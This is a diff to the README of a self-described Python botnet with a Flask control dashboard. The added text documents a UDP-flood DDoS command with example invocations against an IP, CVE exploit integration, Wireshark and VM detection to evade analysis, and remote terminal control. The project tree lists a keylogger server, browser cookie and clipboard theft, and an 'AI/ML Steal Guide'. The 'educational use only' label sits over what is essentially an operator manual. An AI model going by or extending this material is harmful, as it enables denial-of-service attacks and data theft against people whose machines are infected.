@@ -29,6 +29,7 @@
 
 ### 🔐 Security and Encryption
 - **AES-256-CBC** encryption system
+- **4 Layer** encryption system
 - **Anti-Analysis** systems (Wireshark detection)
 - **Tor Network** support
 - **IPv6** and **IPv4** dual-stack support
@@ -44,7 +45,22 @@
 - **Process Monitoring** (real CPU usage)
 - **Screenshot** capture
 - **System Information** gathering
-- **VM Detection** (virtual machine detection)
+- **VM Detection** (Virtual Machine Area Detection)
+- **WireShark Detection** System
+
+### 📊 Monitoring and Analysis
+- **Real-time bot monitoring**
+- **System information gathering**
+- **Network mapping** capabilities
+- **Process monitoring**
+- **VM detection** systems
+- **Performance metrics**
+
+### ⚔️ Attack Capabilities
+- **DDoS attacks** (UDP flood)
+- **Customizable parameters** (duration, threads)
+- **Educational use only**
+- **Safety limitations** built-in
 
 ### 🌐 Web Dashboard
 - **Modern Flask** based web interface
@@ -54,10 +70,11 @@
 - **P2P Network** status
 - **Tor/Clearnet** bot separation
 - **Responsive** design
+- **Remote Terminal Control** system
 
 ### 🔍 Advanced Features
 - **Network Mapping** (network discovery)
-- **Vulnerability Scanner** integration
+- **CVE Exploits** integration
 - **Multi-threaded** operations
 - **Automatic reconnection** system
 - **Environment variable** support
@@ -72,9 +89,10 @@ Botnet/
 ├── Kserver.py             # Keylogger Server (Separate)
 ├── web_dashboard.py       # Web Dashboard
 ├── clipboard_data/        # Clipboard Data
-├── cookies/              # Browser Cookies
-├── downloads/            # Downloaded Files
-└── README.md
+├── cookies/               # Browser Cookies
+├── downloads/             # Downloaded Files
+├── Bot Guide.txt          # AI/ML Steal Guide For future versions
+└── README.md              
 ```
 
 ### 🔄 Communication Flow
@@ -276,6 +294,10 @@ screenshot <bot_id>
 # Automatic screenshots (every 10 seconds)
 ss start <bot_id>
 ss stop <bot_id>
+
+# DDoS attacks 
+ddos start <bot_id> <target_ip> # Optional [--duration 30] [--threads 50]
+ddos stop <bot_id>
 ```
 
 ### 🔍 Data Collection
@@ -437,6 +459,22 @@ Use these commands:
 - `ss stop <bot_id>` - Stop automatic screenshots
 - Screenshots are saved to `ScreenS/` folder
 
+**How do I use DDoS attacks?**
+
+```bash
+# Basic DDoS attack (30 seconds, 50 threads)
+ddos start Bot-123 192.168.1.100
+
+# Custom duration and threads
+ddos start Bot-123 192.168.1.100 --duration 60 --threads 25
+
+# Stop DDoS attack
+ddos stop Bot-123
+```
+- Max duration: 300 seconds
+- Max threads: 100
+- Attack type: UDP flood on port 80
+
 ### 🌐 Network & Security
 
 **How do I enable Tor network?**
@@ -497,7 +535,10 @@ ss ?
 
 ### 📜 Copyright
 
-**This code belongs entirely to me (Fatih Emre).** 
+**This code belongs entirely to Zer0 Crypt0(so Me).** 
+- Copying and publishing this Project is prohibited.
+You can edit it to your liking, but do not copy it exactly.
+
 
 ### ✅ Permitted Uses
 
@@ -569,6 +610,13 @@ Use GitHub Issues for bug reports:
 - **Discussions:** GitHub Discussions
 - **Instagram:** @zer0crypt0
 
+## 🌏 Social Networks
+
+- **Instagram:** @zer0crypt0
+- **YouTube:** @FatihEmreZC
+- **Medium:** @fgedik754
+- **BlueSky:** @zer0crypt0.bsky.social
+
 ---
 
 <div align="center">
@@ -579,6 +627,6 @@ Use GitHub Issues for bug reports:
 
 *Developed for educational purposes. Use responsibly.*
 
-**⚠️ Publishing this code claiming "I made it" is PROHIBITED! ⚠️**
+**Thank you again to everyone who supports me**
 
 </div>
